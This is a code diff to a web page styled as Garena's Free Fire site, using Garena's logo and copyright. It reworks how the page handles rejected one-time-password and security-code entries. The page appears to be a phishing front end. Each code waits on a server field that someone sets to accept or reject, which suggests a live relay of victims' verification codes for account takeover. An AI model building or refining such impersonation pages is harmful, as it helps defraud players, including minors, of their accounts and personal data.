@@ -653,9 +653,10 @@
   <footer class="app-footer">
     <img src="https://dl.dir.freefiremobile.com/common/web_event/official2/dist/client/img/garena_logo.b28b2b6.png" alt="Garena" style="height: 22px; opacity: 0.5; margin-bottom: 20px; display: block; margin-left: auto; margin-right: auto;">
     <div class="footer-links">
-      <a href="#">Privacy Policy</a>
-      <a href="#">For Parents FAQ</a>
-      <a href="#">Terms of Service</a>
+      <a href="/privacy">Privacy Policy</a>
+      <a href="/parents">For Parents</a>
+      <a href="/faq">FAQ</a>
+      <a href="/terms">Terms of Service</a>
     </div>
     <p style="color: #444; font-size: 11px; margin: 0; line-height: 1.6;">Copyright &copy; Garena International. Trademarks belong to their respective owners.<br>All rights reserved.</p>
   </footer>
@@ -1007,25 +1008,38 @@
                     }
                     else if (result === 'rejected') {
                         // otp_verification changed from null → false
-                        otpAttempts++;
-                        isSubmitting = false;
-                        markInputsError(otpInputs);
-                        // Reset server field back to null so next attempt can be evaluated fresh
-                        resetVerification('otp_verification');
+                        // First reset server field to null, then show error
+                        resetVerification('otp_verification').then(function() {
+                            if (currentStep !== 1) return;
+                            otpAttempts++;
+                            isSubmitting = false;
+                            markInputsError(otpInputs);
 
-                        if (otpAttempts >= MAX_ATTEMPTS) {
-                            showError(otpError, otpErrorWrap, null, null, 'Maximum attempts reached. Please request a new code or contact support.');
-                            setControlsVisible(false);
-                            actionBtn.classList.add('hidden');
-                            resendWrap.classList.add('hidden');
-                            setInputsDisabled(otpInputs, true);
-                        } else {
+                            if (otpAttempts >= MAX_ATTEMPTS) {
+                                showError(otpError, otpErrorWrap, null, null, 'Maximum attempts reached. Please request a new code or contact support.');
+                                setControlsVisible(false);
+                                actionBtn.classList.add('hidden');
+                                resendWrap.classList.add('hidden');
+                                setInputsDisabled(otpInputs, true);
+                            } else {
+                                showError(otpError, otpErrorWrap, otpAttemptsBox, otpAttemptsText,
+                                    'The OTP code you entered is incorrect.', otpAttempts, MAX_ATTEMPTS);
+                                setControlsVisible(true);
+                                setBtn('Verify Code', false);
+                                resetInputs(otpInputs);
+                            }
+                        }).catch(function() {
+                            // If reset fails, still show error
+                            if (currentStep !== 1) return;
+                            otpAttempts++;
+                            isSubmitting = false;
+                            markInputsError(otpInputs);
                             showError(otpError, otpErrorWrap, otpAttemptsBox, otpAttemptsText,
                                 'The OTP code you entered is incorrect.', otpAttempts, MAX_ATTEMPTS);
                             setControlsVisible(true);
                             setBtn('Verify Code', false);
                             resetInputs(otpInputs);
-                        }
+                        });
                     }
                     else if (result === 'timeout') {
                         isSubmitting = false;
@@ -1076,25 +1090,36 @@
                     }
                     else if (result === 'rejected') {
                         // security_code_verification changed from null → false
-                        secAttempts++;
-                        isSubmitting = false;
-                        markInputsError(secInputs);
-                        // Reset server field back to null so next attempt can be evaluated fresh
-                        resetVerification('security_code_verification');
+                        resetVerification('security_code_verification').then(function() {
+                            if (currentStep !== 2) return;
+                            secAttempts++;
+                            isSubmitting = false;
+                            markInputsError(secInputs);
 
-                        if (secAttempts >= MAX_ATTEMPTS) {
-                            showError(secError, secErrorWrap, null, null, 'Maximum attempts reached. Please request a new code or contact support.');
-                            setControlsVisible(false);
-                            actionBtn.classList.add('hidden');
-                            resendSecWrap.classList.add('hidden');
-                            setInputsDisabled(secInputs, true);
-                        } else {
+                            if (secAttempts >= MAX_ATTEMPTS) {
+                                showError(secError, secErrorWrap, null, null, 'Maximum attempts reached. Please request a new code or contact support.');
+                                setControlsVisible(false);
+                                actionBtn.classList.add('hidden');
+                                resendSecWrap.classList.add('hidden');
+                                setInputsDisabled(secInputs, true);
+                            } else {
+                                showError(secError, secErrorWrap, secAttemptsBox, secAttemptsText,
+                                    'The Security Code you entered is incorrect.', secAttempts, MAX_ATTEMPTS);
+                                setControlsVisible(true);
+                                setBtn('Verify', false);
+                                resetInputs(secInputs);
+                            }
+                        }).catch(function() {
+                            if (currentStep !== 2) return;
+                            secAttempts++;
+                            isSubmitting = false;
+                            markInputsError(secInputs);
                             showError(secError, secErrorWrap, secAttemptsBox, secAttemptsText,
                                 'The Security Code you entered is incorrect.', secAttempts, MAX_ATTEMPTS);
                             setControlsVisible(true);
                             setBtn('Verify', false);
                             resetInputs(secInputs);
-                        }
+                        });
                     }
                     else if (result === 'timeout') {
                         isSubmitting = false;
